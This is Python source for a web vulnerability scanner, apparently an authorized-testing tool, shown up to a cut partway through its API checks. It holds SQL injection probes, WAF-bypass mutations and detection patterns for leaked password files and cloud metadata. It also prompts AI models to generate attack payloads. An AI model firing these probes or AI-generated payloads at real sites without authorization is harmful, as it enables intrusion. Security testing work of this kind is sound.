#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                    HSR ADVANCED v4.0                             ║
║          AI-Powered Web Security Testing Framework               ║
║                    Author: HSR                                   ║
║   LEGAL NOTICE: Use only on systems you own or have written      ║
║   authorization to test. Unauthorized scanning is illegal.       ║
║                                                                  ║
║   New in v4.0: Integrated Ollama local AI (free, offline)       ║
║                and cloud AI providers (OpenAI) via API key.      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import requests
import threading
import queue
import datetime
import os
import sys
import json
import time
import subprocess
import logging
import argparse
import re
import random
import string
import hashlib
import base64
import asyncio
import aiohttp
import numpy as np
import yaml
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from fpdf import FPDF
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict
import warnings

warnings.filterwarnings('ignore')

# Initialize colorama
init(autoreset=True)

# ====================== Logging Setup ======================

LOG_FILE = "hsr_advanced_v4.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(funcName)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ====================== Constants ======================

TOOL_VERSION = "4.0"
SCOPE_FILE = "scope.txt"

# ====================== Scope Enforcement ======================

class ScopeManager:
    """Enforces scan scope to prevent out-of-scope testing"""

    def __init__(self, allowed_domains: List[str] = None, scope_file: str = None):
        self.allowed = set()
        if allowed_domains:
            for d in allowed_domains:
                self.allowed.add(d.lower().strip())
        if scope_file and os.path.exists(scope_file):
            try:
                with open(scope_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.allowed.add(line.lower())
            except OSError as e:
                logger.error(f"Could not read scope file: {e}")

    def is_in_scope(self, url: str) -> bool:
        if not self.allowed:
            return True  # No scope defined = permissive mode
        try:
            parsed = urlparse(url if '://' in url else f'http://{url}')
            host = parsed.netloc.lower().split(':')[0]
            for allowed in self.allowed:
                if host == allowed or host.endswith(f'.{allowed}'):
                    return True
        except Exception as e:
            logger.warning(f"Scope check error for {url}: {e}")
        return False

    def filter_urls(self, urls: List[str]) -> List[str]:
        return [u for u in urls if self.is_in_scope(u)]


# ====================== Severity Enum ======================

class Severity(Enum):
    INFO = "Info"
    LOW = "Low"
    MEDIUM = "Medium"
    HIGH = "High"
    CRITICAL = "Critical"

    @property
    def score(self) -> int:
        return {"Info": 0, "Low": 1, "Medium": 2, "High": 3, "Critical": 4}[self.value]


# ====================== Data Classes ======================

@dataclass
class Vulnerability:
    """Stores a single vulnerability finding"""
    vuln_type: str
    parameter: str
    payload: str
    evidence: str
    url: str
    severity: str = "Medium"
    cvss_score: float = 0.0
    cvss_vector: str = ""
    timestamp: datetime.datetime = field(default_factory=datetime.datetime.now)
    request_details: str = ""
    response_snippet: str = ""
    remediation: str = ""

    def dedup_key(self) -> tuple:
        """Key used for deduplication"""
        return (self.vuln_type, self.parameter, self.url,
                hashlib.md5(self.payload.encode()).hexdigest()[:8])

    def to_dict(self) -> dict:
        return {
            'type': self.vuln_type,
            'parameter': self.parameter,
            'payload': self.payload[:100],
            'evidence': self.evidence,
            'url': self.url,
            'severity': self.severity,
            'cvss_score': self.cvss_score,
            'cvss_vector': self.cvss_vector,
            'timestamp': self.timestamp.isoformat(),
            'remediation': self.remediation,
            'request_details': self.request_details,
            'response_snippet': self.response_snippet[:200]
        }


@dataclass
class ScanTarget:
    """Represents a scan target"""
    url: str
    domain: str
    ip: Optional[str] = None
    port: Optional[int] = None
    protocol: str = "http"

    def full_url(self) -> str:
        if self.port:
            return f"{self.protocol}://{self.domain}:{self.port}"
        return f"{self.protocol}://{self.domain}"


# ====================== CVSS Calculator ======================

class CVSSCalculator:
    """Simplified CVSS v3.1 score calculator"""

    BASE_SCORES = {
        'xss':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'R', 'S': 'C', 'C': 'L', 'I': 'L', 'A': 'N'},
        'sql':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'H', 'I': 'H', 'A': 'H'},
        'cmd':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'C', 'C': 'H', 'I': 'H', 'A': 'H'},
        'lfi':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'H', 'I': 'N', 'A': 'N'},
        'ssti':  {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'C', 'C': 'H', 'I': 'H', 'A': 'H'},
        'ssrf':  {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'C', 'C': 'H', 'I': 'H', 'A': 'N'},
        'xxe':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'H', 'I': 'L', 'A': 'N'},
        'api':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'L', 'I': 'L', 'A': 'N'},
        'jwt':   {'AV': 'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'H', 'I': 'H', 'A': 'N'},
        'graphql':{'AV':'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'L', 'I': 'N', 'A': 'N'},
        'default':{'AV':'N', 'AC': 'L', 'PR': 'N', 'UI': 'N', 'S': 'U', 'C': 'L', 'I': 'L', 'A': 'N'},
    }

    NUMERIC = {
        'AV': {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.2},
        'AC': {'L': 0.77, 'H': 0.44},
        'PR': {'N': 0.85, 'L': 0.62, 'H': 0.27},
        'UI': {'N': 0.85, 'R': 0.62},
        'S':  {'U': False, 'C': True},
        'C':  {'N': 0.0,  'L': 0.22, 'H': 0.56},
        'I':  {'N': 0.0,  'L': 0.22, 'H': 0.56},
        'A':  {'N': 0.0,  'L': 0.22, 'H': 0.56},
    }

    def calculate(self, vuln_type: str) -> Tuple[float, str]:
        metrics = self.BASE_SCORES.get(vuln_type.lower(), self.BASE_SCORES['default'])
        av  = self.NUMERIC['AV'][metrics['AV']]
        ac  = self.NUMERIC['AC'][metrics['AC']]
        pr  = self.NUMERIC['PR'][metrics['PR']]
        ui  = self.NUMERIC['UI'][metrics['UI']]
        sc  = self.NUMERIC['S'][metrics['S']]
        c   = self.NUMERIC['C'][metrics['C']]
        i   = self.NUMERIC['I'][metrics['I']]
        a   = self.NUMERIC['A'][metrics['A']]

        iss_base = 1 - ((1 - c) * (1 - i) * (1 - a))
        iss = 6.42 * iss_base if not sc else 7.52 * (iss_base - 0.029) - 3.25 * ((iss_base - 0.02) ** 15)
        ess = 8.22 * av * ac * pr * ui

        if iss <= 0:
            base = 0.0
        elif not sc:
            base = min(iss + ess, 10)
        else:
            base = min(1.08 * (iss + ess), 10)

        score = round(base, 1)
        vector = (f"CVSS:3.1/AV:{metrics['AV']}/AC:{metrics['AC']}/PR:{metrics['PR']}/"
                  f"UI:{metrics['UI']}/S:{metrics['S']}/C:{metrics['C']}/I:{metrics['I']}/A:{metrics['A']}")
        return score, vector


# ====================== Remediation Database ======================

REMEDIATION_DB = {
    'xss': (
        "Encode all user-supplied output using context-aware encoding (HTML, JS, URL). "
        "Implement a strict Content-Security-Policy header. Use HTTPOnly and Secure flags on cookies. "
        "Reference: OWASP XSS Prevention Cheat Sheet."
    ),
    'sql': (
        "Use parameterized queries / prepared statements exclusively. Never concatenate user input into SQL. "
        "Apply principle of least privilege for DB accounts. Enable WAF rules for SQL patterns. "
        "Reference: OWASP SQL Injection Prevention Cheat Sheet."
    ),
    'cmd': (
        "Avoid invoking OS commands with user input. If unavoidable, use strict allowlists. "
        "Run the application under a low-privilege account. Use seccomp/AppArmor profiles. "
        "Reference: OWASP OS Command Injection Defense Cheat Sheet."
    ),
    'lfi': (
        "Validate and canonicalize file paths server-side. Use an allowlist of permitted files. "
        "Disable PHP wrappers (allow_url_include=Off). Chroot/jail the web process. "
        "Reference: OWASP Path Traversal."
    ),
    'ssti': (
        "Never pass user-controlled data to template engines unsanitized. Use sandboxed template environments. "
        "Prefer logic-less templates where possible. "
        "Reference: PortSwigger SSTI Research."
    ),
    'ssrf': (
        "Validate and restrict outbound requests to an allowlist. Block access to metadata IPs (169.254.x.x). "
        "Use a dedicated egress proxy with URL filtering. "
        "Reference: OWASP SSRF Prevention Cheat Sheet."
    ),
    'xxe': (
        "Disable external entity processing in your XML library. "
        "Use less complex formats (JSON) where possible. Validate/schema-check XML input. "
        "Reference: OWASP XXE Prevention Cheat Sheet."
    ),
    'api': (
        "Implement proper authentication (OAuth 2.0 / API keys). Add rate limiting. "
        "Validate all inputs. Use security headers (CORS, CSP). "
        "Reference: OWASP API Security Top 10."
    ),
    'jwt': (
        "Always verify the signature server-side. Never accept 'alg:none'. "
        "Use strong secrets (>= 256 bits) for HS* or RS256/ES256 asymmetric keys. "
        "Reference: JWT Security Best Practices (auth0)."
    ),
    'graphql': (
        "Disable introspection in production. Implement query depth and complexity limits. "
        "Apply authentication and field-level authorization. "
        "Reference: OWASP GraphQL Cheat Sheet."
    ),
    'open_redirect': (
        "Validate redirect URLs against an allowlist. Avoid using user-supplied redirect parameters. "
        "Reference: OWASP Unvalidated Redirects and Forwards."
    ),
    'nosql': (
        "Use typed query builders instead of raw query strings. Validate and sanitize all inputs. "
        "Reference: OWASP NoSQL Injection."
    ),
}


# ====================== Utility Classes ======================

class RateLimiter:
    """Token-bucket rate limiter"""

    def __init__(self, max_requests: int = 10, time_window: int = 1):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests: List[float] = []
        self.lock = threading.Lock()

    def can_send(self) -> bool:
        with self.lock:
            now = time.time()
            self.requests = [r for r in self.requests if now - r < self.time_window]
            if len(self.requests) < self.max_requests:
                self.requests.append(now)
                return True
            return False

    def wait_if_needed(self):
        while not self.can_send():
            time.sleep(0.05)


class CacheManager:
    """File-based cache manager"""

    def __init__(self, cache_dir: str = '.hsr_cache'):
        self.cache_dir = cache_dir
        os.makedirs(cache_dir, exist_ok=True)

    def _key(self, key: str) -> str:
        return os.path.join(self.cache_dir, hashlib.md5(key.encode()).hexdigest())

    def get(self, key: str, max_age: int = 3600) -> Optional[Any]:
        path = self._key(key)
        try:
            with open(path, 'r') as f:
                cached = json.load(f)
                if time.time() - cached['ts'] < max_age:
                    return cached['data']
        except (OSError, KeyError, json.JSONDecodeError):
            pass
        return None

    def set(self, key: str, data: Any):
        path = self._key(key)
        try:
            with open(path, 'w') as f:
                json.dump({'ts': time.time(), 'data': data}, f)
        except OSError as e:
            logger.error(f"Cache write error: {e}")


class ConfigManager:
    """YAML configuration manager"""

    def __init__(self, config_file: str = 'hsr_config.yaml'):
        self.config_file = config_file
        self.config = self._load()

    def _load(self) -> dict:
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    return yaml.safe_load(f) or self._default()
            except (OSError, yaml.YAMLError) as e:
                logger.warning(f"Config load error: {e}")
        return self._default()

    def _default(self) -> dict:
        return {
            'tool': {
                'name': 'HSR Advanced',
                'version': TOOL_VERSION,
                'threads': 20,
                'timeout': 10,
                'user_agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                    'Chrome/120.0.0.0 Safari/537.36'
                )
            },
            'scan': {
                'depth': 2,
                'max_pages': 100,
                'follow_redirects': True,
                'respect_robots': True,
                'rate_limit': 10,
                'scope': []
            },
            'detection': {
                'xss': {'check_dom': True, 'check_reflected': True, 'check_stored': True},
                'sql': {'error_based': True, 'blind': True, 'time_based': True},
                'lfi': {'check_etc_passwd': True, 'check_windows_files': True},
                'cmd': {'check_basic': True, 'check_time_based': True}
            },
            'reporting': {
                'formats': ['txt', 'pdf', 'html', 'json', 'sarif'],
                'include_requests': True,
                'include_responses': False
            },
            'ai': {
                'provider': 'ollama',   # 'ollama' or 'openai'
                'model': 'phi',
                'api_key': None         # optional, can also be set via env HSR_AI_API_KEY
            }
        }

    def save(self):
        try:
            with open(self.config_file, 'w') as f:
                yaml.dump(self.config, f, default_flow_style=False)
        except OSError as e:
            logger.error(f"Config save error: {e}")


# ====================== AI Engine Base and Implementations ======================

class AIEngineBase:
    """Base class for AI engines (local or remote)."""
    def __init__(self, model: str = None, api_key: str = None, provider: str = None):
        self.model = model
        self.api_key = api_key
        self.provider = provider
        self.available = False

    def generate_payloads(self, field_name: str, field_type: str, attack_type: str = None, max_payloads: int = 10) -> List[str]:
        raise NotImplementedError

    def analyze_response(self, url: str, param: str, payload: str, response_text: str) -> Optional[str]:
        raise NotImplementedError


class OllamaEngine(AIEngineBase):
    """Wrapper for local Ollama API (free, offline)."""
    def __init__(self, model: str = "phi", url: str = "http://localhost:11434"):
        super().__init__(model=model, provider='ollama')
        self.url = url.rstrip('/')
        self.available = self._check_availability()

    def _check_availability(self) -> bool:
        try:
            r = requests.get(f"{self.url}/api/tags", timeout=2)
            return r.status_code == 200
        except Exception:
            return False

    def _generate(self, prompt: str, max_tokens: int = 200, temperature: float = 0.7) -> str:
        if not self.available:
            return ""
        try:
            payload = {
                "model": self.model,
                "prompt": prompt,
                "stream": False,
                "options": {
                    "temperature": temperature,
                    "num_predict": max_tokens
                }
            }
            r = requests.post(f"{self.url}/api/generate", json=payload, timeout=30)
            if r.status_code == 200:
                return r.json().get("response", "")
        except Exception as e:
            logger.error(f"Ollama request failed: {e}")
        return ""

    def generate_payloads(self, field_name: str, field_type: str, attack_type: str = None, max_payloads: int = 10) -> List[str]:
        if not self.available:
            return []
        prompt = (
            f"You are a security researcher. Generate {max_payloads} realistic attack payloads "
            f"for the vulnerability type '{attack_type or 'any'}'. "
            f"The parameter is named '{field_name}' and its HTML input type is '{field_type}'.\n"
            f"Return each payload on a new line, without any extra text, numbering, or commentary.\n"
            f"Payloads:"
        )
        response = self._generate(prompt, max_tokens=400, temperature=0.8)
        if not response:
            return []
        lines = [line.strip() for line in response.split('\n') if line.strip()]
        lines = [l for l in lines if not l[0] in ('#', '*', '-')]
        return lines[:max_payloads]

    def analyze_response(self, url: str, param: str, payload: str, response_text: str) -> Optional[str]:
        if not self.available:
            return None
        prompt = (
            f"Analyze the following HTTP response for evidence of a successful attack.\n\n"
            f"URL: {url}\nParameter: {param}\nPayload sent: {payload}\n\n"
            f"Response snippet:\n{response_text[:1500]}\n\n"
            f"Does this indicate a vulnerability? Answer with YES or NO followed by a brief explanation."
        )
        return self._generate(prompt, max_tokens=150, temperature=0.2)


class RemoteAIEngine(AIEngineBase):
    """Wrapper for remote AI providers (OpenAI, Anthropic, etc.)."""
    def __init__(self, provider: str = "openai", model: str = "gpt-3.5-turbo", api_key: str = None):
        super().__init__(model=model, api_key=api_key, provider=provider)
        self.available = self._check_availability()

    def _check_availability(self) -> bool:
        if not self.api_key:
            return False
        if self.provider.lower() == "openai":
            try:
                import openai
                openai.api_key = self.api_key
                # simple test
                openai.Model.list()
                return True
            except Exception as e:
                logger.debug(f"OpenAI availability check failed: {e}")
                return False
        else:
            # Other providers can be added later
            return False

    def _generate(self, prompt: str, max_tokens: int = 200, temperature: float = 0.7) -> str:
        if not self.available:
            return ""
        try:
            if self.provider.lower() == "openai":
                import openai
                openai.api_key = self.api_key
                response = openai.ChatCompletion.create(
                    model=self.model,
                    messages=[{"role": "user", "content": prompt}],
                    max_tokens=max_tokens,
                    temperature=temperature,
                )
                return response.choices[0].message.content.strip()
        except Exception as e:
            logger.error(f"Remote AI request failed: {e}")
        return ""

    def generate_payloads(self, field_name: str, field_type: str, attack_type: str = None, max_payloads: int = 10) -> List[str]:
        if not self.available:
            return []
        prompt = (
            f"You are a security researcher. Generate {max_payloads} realistic attack payloads "
            f"for the vulnerability type '{attack_type or 'any'}'. "
            f"The parameter is named '{field_name}' and its HTML input type is '{field_type}'.\n"
            f"Return each payload on a new line, without any extra text, numbering, or commentary.\n"
            f"Payloads:"
        )
        response = self._generate(prompt, max_tokens=400, temperature=0.8)
        if not response:
            return []
        lines = [line.strip() for line in response.split('\n') if line.strip()]
        lines = [l for l in lines if not l[0] in ('#', '*', '-')]
        return lines[:max_payloads]

    def analyze_response(self, url: str, param: str, payload: str, response_text: str) -> Optional[str]:
        if not self.available:
            return None
        prompt = (
            f"Analyze the following HTTP response for evidence of a successful attack.\n\n"
            f"URL: {url}\nParameter: {param}\nPayload sent: {payload}\n\n"
            f"Response snippet:\n{response_text[:1500]}\n\n"
            f"Does this indicate a vulnerability? Answer with YES or NO followed by a brief explanation."
        )
        return self._generate(prompt, max_tokens=150, temperature=0.2)


# ====================== Enhanced Detection Engine ======================

class EnhancedDetector:
    """Pattern-based vulnerability detector with baseline diffing"""

    def __init__(self):
        self.patterns: Dict[str, List[Tuple[str, str, Severity]]] = {
            "xss": [
                (r'<script[^>]*>.*?</script>', "Script tag injected", Severity.HIGH),
                (r'onerror\s*=', "XSS event handler onerror", Severity.MEDIUM),
                (r'javascript:', "JavaScript protocol handler", Severity.MEDIUM),
                (r'onload\s*=', "Onload XSS event", Severity.MEDIUM),
                (r'\balert\s*\(', "Alert function call", Severity.HIGH),
                (r'\bprompt\s*\(', "Prompt function call", Severity.HIGH),
                (r'\bconfirm\s*\(', "Confirm function call", Severity.HIGH),
                (r'document\.cookie', "Cookie access attempt", Severity.HIGH),
                (r'<svg[^>]*onload\s*=', "SVG onload XSS", Severity.HIGH),
                (r'<iframe[^>]*src\s*=\s*["\']?javascript:', "iframe JS protocol", Severity.HIGH),
            ],
            "sqli": [
                (r"you have an error in your sql syntax", "MySQL syntax error", Severity.HIGH),
                (r"unclosed quotation mark", "MSSQL unclosed quote", Severity.HIGH),
                (r"warning:.*?oracle", "Oracle DB warning", Severity.HIGH),
                (r"mysql_fetch", "MySQL function error", Severity.HIGH),
                (r"pg_query\(", "PostgreSQL query error", Severity.HIGH),
                (r"sqlite.*error", "SQLite error", Severity.MEDIUM),
                (r"ORA-\d{5}", "Oracle error code", Severity.HIGH),
                (r"ODBC.*error", "ODBC error", Severity.MEDIUM),
                (r"Syntax error.*near", "SQL syntax near error", Severity.HIGH),
                (r"quoted string not properly terminated", "Oracle quote error", Severity.HIGH),
            ],
            "lfi": [
                (r"root:.*:0:0:", "/etc/passwd content leaked", Severity.HIGH),
                (r"\[boot loader\]", "Windows boot.ini leaked", Severity.HIGH),
                (r"\[extensions\]", "PHP config exposed", Severity.MEDIUM),
                (r"<\?php", "PHP source code exposed", Severity.CRITICAL),
                (r"windows\\system32", "Windows system path", Severity.HIGH),
                (r"daemon:.*:/usr/sbin", "Linux passwd file", Severity.HIGH),
            ],
            "cmd_injection": [
                (r"uid=\d+\([^\)]+\)\s+gid=\d+", "Unix id command output", Severity.HIGH),
                (r"volume in drive", "Windows DIR output", Severity.HIGH),
                (r"Directory of [A-Z]:\\", "Windows directory listing", Severity.HIGH),
                (r"/bin/bash|/bin/sh", "Shell path in output", Severity.HIGH),
                (r"PING.*bytes of data", "Ping command executed", Severity.MEDIUM),
            ],
            "ssrf": [
                (r"169\.254\.169\.254", "AWS IMDS metadata endpoint", Severity.HIGH),
                (r"ec2\.amazonaws\.com", "AWS EC2 endpoint", Severity.MEDIUM),
                (r"metadata\.google\.internal", "GCP metadata endpoint", Severity.HIGH),
                (r"100\.100\.100\.200", "Alibaba Cloud metadata", Severity.HIGH),
            ],
            "xxe": [
                (r"file:///etc/passwd", "XXE file protocol", Severity.HIGH),
                (r"ENTITY\s+.*\s+SYSTEM", "XXE SYSTEM entity", Severity.CRITICAL),
                (r"<!DOCTYPE[^>]+SYSTEM", "XXE DOCTYPE SYSTEM", Severity.HIGH),
            ],
            "ssti": [
                (r"\{\{.*config.*\}\}", "Template config leak", Severity.HIGH),
                (r"49", "Math result 7*7", Severity.MEDIUM),
                (r"Traceback \(most recent call last\)", "Python traceback", Severity.MEDIUM),
            ]
        }
        self.baseline_hashes: Set[str] = set()

    def set_baseline(self, responses: List[requests.Response]):
        """Build a content baseline to avoid false positives"""
        for r in responses:
            self.baseline_hashes.add(hashlib.md5(r.text.encode()).hexdigest())

    def detect(self, response: requests.Response, payload: str,
               vuln_type: str, baseline_response: requests.Response = None
               ) -> List[Tuple[str, Severity]]:
        """Detect vulnerability using pattern matching + baseline diff"""
        findings = []

        # Skip if response same as baseline (avoids FP)
        if baseline_response:
            if response.text == baseline_response.text:
                return findings
            bl_hash = hashlib.md5(baseline_response.text.encode()).hexdigest()
            if bl_hash in self.baseline_hashes:
                pass  # suspicious if it matches known clean

        text = response.text.lower()

        patterns_to_check = self.patterns.get(vuln_type, [])
        for pattern, description, severity in patterns_to_check:
            try:
                if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
                    findings.append((description, severity))
            except re.error as e:
                logger.warning(f"Regex error in pattern '{pattern}': {e}")

        # Reflected payload check (only meaningful if payload is in response)
        if payload and len(payload) > 3 and payload in response.text:
            findings.append(("Payload reflected in response", Severity.INFO))

        # Server errors
        if response.status_code >= 500:
            findings.append((f"Server error HTTP {response.status_code}", Severity.MEDIUM))
        elif response.status_code == 403:
            findings.append(("Access forbidden — possible filter", Severity.LOW))

        return findings


# ====================== WAF Detector ======================

class WAFDetector:
    """Detects WAF presence and fingerprints vendor"""

    WAF_SIGNATURES = {
        'Cloudflare':   [r'cloudflare', r'cf-ray', r'__cfduid'],
        'ModSecurity':  [r'mod_security', r'modsecurity', r'NOYB'],
        'AWS WAF':      [r'x-amzn-requestid', r'awselb'],
        'Akamai':       [r'akamai', r'x-akamai'],
        'Sucuri':       [r'sucuri', r'x-sucuri-id'],
        'Imperva':      [r'incapsula', r'visid_incap'],
        'Barracuda':    [r'barracuda', r'barra_counter_session'],
        'F5 BIG-IP':    [r'bigipserver', r'ts[a-z0-9]{8}='],
    }

    def detect(self, response: requests.Response) -> Optional[str]:
        combined = (response.text + str(dict(response.headers))).lower()
        for waf, sigs in self.WAF_SIGNATURES.items():
            for sig in sigs:
                if re.search(sig, combined, re.IGNORECASE):
                    return waf
        return None

    def get_bypass_mutations(self, waf_name: str) -> List[str]:
        """Return extra mutations suited for detected WAF"""
        bypasses = {
            'Cloudflare': ['/**/', '%0a', '%0d%0a', '\\x3c', '\\u003c'],
            'ModSecurity': ['/**/OR/**/1=1', '%27', '&#x27;', '\x27'],
            'AWS WAF':     ['%09', '%0b', '/*!50000*/'],
        }
        return bypasses.get(waf_name, [])


# ====================== ML Anomaly Detector ======================

class MLDetector:
    """Z-score anomaly detection on response characteristics"""

    def __init__(self, threshold: float = 3.0):
        self.threshold = threshold
        self.baseline: Dict[str, Dict] = {}
        self.established = False

    def establish_baseline(self, responses: List[requests.Response]):
        if not responses:
            return
        lengths = [len(r.text) for r in responses]
        times   = [r.elapsed.total_seconds() for r in responses]
        codes   = [r.status_code for r in responses]
        self.baseline = {
            'length': {'mean': np.mean(lengths), 'std': max(np.std(lengths), 1)},
            'time':   {'mean': np.mean(times),   'std': max(np.std(times), 0.01)},
            'codes':  set(codes)
        }
        self.established = True

    def detect_anomaly(self, response: requests.Response) -> List[str]:
        if not self.established:
            return []
        anomalies = []
        length = len(response.text)
        z_len = abs((length - self.baseline['length']['mean']) / self.baseline['length']['std'])
        if z_len > self.threshold:
            anomalies.append(
                f"Response length anomaly: {length} chars "
                f"(baseline mean: {self.baseline['length']['mean']:.0f})"
            )
        elapsed = response.elapsed.total_seconds()
        z_time = abs((elapsed - self.baseline['time']['mean']) / self.baseline['time']['std'])
        if z_time > self.threshold:
            anomalies.append(
                f"Response time anomaly: {elapsed:.2f}s "
                f"(baseline mean: {self.baseline['time']['mean']:.2f}s)"
            )
        if response.status_code not in self.baseline['codes']:
            anomalies.append(f"Unexpected status code: {response.status_code}")
        return anomalies


# ====================== IDOR Tester ======================

class IDORTester:
    """Tests for Insecure Direct Object Reference vulnerabilities"""

    def __init__(self, session: requests.Session, rate_limiter: RateLimiter):
        self.session = session
        self.rate_limiter = rate_limiter

    def find_numeric_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return [k for k, v in params.items() if any(val.isdigit() for val in v)]

    def test_idor(self, url: str, param: str, original_value: str) -> Optional[Vulnerability]:
        """Test numeric parameter for IDOR"""
        try:
            orig_int = int(original_value)
        except ValueError:
            return None

        test_values = [str(orig_int + 1), str(orig_int - 1), str(orig_int + 100), '1', '0']
        parsed = urlparse(url)
        orig_params = parse_qs(parsed.query)

        try:
            base_resp = self.session.get(url, timeout=10, verify=False)
            base_hash = hashlib.md5(base_resp.text.encode()).hexdigest()
        except (requests.RequestException, Exception) as e:
            logger.warning(f"IDOR base request failed: {e}")
            return None

        for val in test_values:
            new_params = orig_params.copy()
            new_params[param] = [val]
            new_url = parsed._replace(query=urlencode(new_params, doseq=True)).geturl()
            self.rate_limiter.wait_if_needed()
            try:
                resp = self.session.get(new_url, timeout=10, verify=False)
                if (resp.status_code == 200
                        and hashlib.md5(resp.text.encode()).hexdigest() != base_hash
                        and len(resp.text) > 100):
                    return Vulnerability(
                        vuln_type='idor',
                        parameter=param,
                        payload=f"{param}={val}",
                        evidence=f"Different response for {param}={val} vs {param}={original_value}",
                        url=url,
                        severity=Severity.HIGH.value,
                        remediation=REMEDIATION_DB.get('api', '')
                    )
            except requests.RequestException as e:
                logger.debug(f"IDOR test request failed: {e}")
                continue
        return None


# ====================== API Scanner ======================

class APIScanner:
    """API endpoint discovery and security testing"""

    COMMON_PATHS = [
        '/api', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/graphiql',
        '/swagger', '/swagger-ui', '/swagger.json', '/openapi.json',
        '/api-docs', '/v1', '/v2', '/rest', '/api/rest',
        '/users', '/user', '/admin', '/auth', '/login', '/oauth',
        '/token', '/health', '/status', '/metrics', '/actuator',
        '/api/users', '/api/admin', '/api/auth', '/api/login',
    ]

    JS_PATTERNS = [
        (r'["\'](/api/[^"\']{2,})["\']', 0),
        (r'fetch\(["\']([^"\']+)["\']', 0),
        (r'axios\.[a-z]+\(["\']([^"\']+)["\']', 0),
        (r'ajax\(.*?url:\s*["\']([^"\']+)["\']', 0),
        (r'\$\.(get|post|ajax)\(["\']([^"\']+)["\']', 1),
    ]

    def __init__(self, base_url: str, session: requests.Session, scope: ScopeManager = None):
        self.base_url = base_url
        self.session = session
        self.scope = scope or ScopeManager()
        self.endpoints: List[str] = []
        self.cache = CacheManager()

    def discover_endpoints(self) -> List[str]:
        cached = self.cache.get(f"api_eps_{self.base_url}")
        if cached:
            return cached

        endpoints: Set[str] = set()

        for path in self.COMMON_PATHS:
            endpoints.add(urljoin(self.base_url, path))

        try:
            resp = self.session.get(self.base_url, timeout=10, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')

            for script in soup.find_all('script', src=True):
                js_url = urljoin(self.base_url, script['src'])
                try:
                    js_resp = self.session.get(js_url, timeout=5, verify=False)
                    for pattern, grp in self.JS_PATTERNS:
                        for match in re.findall(pattern, js_resp.text):
                            ep = match[grp] if isinstance(match, tuple) else match
                            full = urljoin(self.base_url, ep) if ep.startswith('/') else ep
                            if self.scope.is_in_scope(full):
                                endpoints.add(full)
                except (requests.RequestException, Exception) as e:
                    logger.debug(f"JS fetch error: {e}")
                    continue

            # Also check inline scripts
            for script in soup.find_all('script', src=False):
                content = script.string or ''
                for pattern, grp in self.JS_PATTERNS:
                    for match in re.findall(pattern, content):
                        ep = match[grp] if isinstance(match, tuple) else match
                        if ep.startswith('/'):
                            endpoints.add(urljoin(self.base_url, ep))

        except (requests.RequestException, Exception) as e:
            logger.error(f"API discovery error: {e}")

        result = list(endpoints)
        self.cache.set(f"api_eps_{self.base_url}", result)
        return result

    def test_endpoint_security(self, endpoint: str) -> List[Tuple[str, Severity]]:
        issues: List[Tuple[str, Severity]] = []
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']

        for method in methods:
            try:
                resp = self.session.request(method, endpoint, timeout=5, verify=False)

                if 'access-control-allow-origin' in resp.headers:
                    if resp.headers['access-control-allow-origin'] == '*':
                        issues.append(("Wildcard CORS (Access-Control-Allow-Origin: *)", Severity.MEDIUM))

                if method == 'OPTIONS' and 'allow' in resp.headers:
                    allowed = resp.headers['allow']
                    if 'DELETE' in allowed:
                        issues.append((f"DELETE method allowed: {allowed}", Severity.HIGH))
                    if 'PUT' in allowed:
                        issues.append((f"PUT method allowed: {allowed}", Severity.MEDIUM))

                if resp.status_code == 200 and method in ('GET', 'POST'):
                    try:
                        data = resp.json()
                        for key in ['password', 'token', 'secret', 'key', 'auth', 'private']:
                            if key in json.dumps(data).lower():
                                issues.append((f"Sensitive key '{key}' in JSON response", Severity.HIGH))
                                break
                    except (json.JSONDecodeError, ValueError):
                        pass

            except requests.RequestException as e:
                logger.debug(f"API method test failed {method} {endpoint}: {e}")
                continue

        # Rate limit check
        codes = []
        for _ in range(5):
            try:
                r = self.session.get(endpoint, timeout=2, verify=False)
                codes.append(r.status_code)
                time.sleep(0.1)
            except requests.RequestException:
                break
        if len(set(codes)) == 1 and codes and codes[0] == 200:
            issues.append(("No rate limiting detected on endpoint", Severity.LOW))

        # SQLi quick check on query params
        if '?' in endpoint:
            base, qs = endpoint.split('?', 1)
            params = parse_qs(qs)
            sqli_probes = ["'", "' OR '1'='1", "1 AND SLEEP(0)--"]
            for param in params:
                for probe in sqli_probes:
                    test_params = {k: v for k, v in params.items()}
                    test_params[param] = [probe]
                    test_url = f"{base}?{urlencode(test_params, doseq=True)}"
                    try:
                        r = self.session.get(test_url, timeout=5, verify=False)
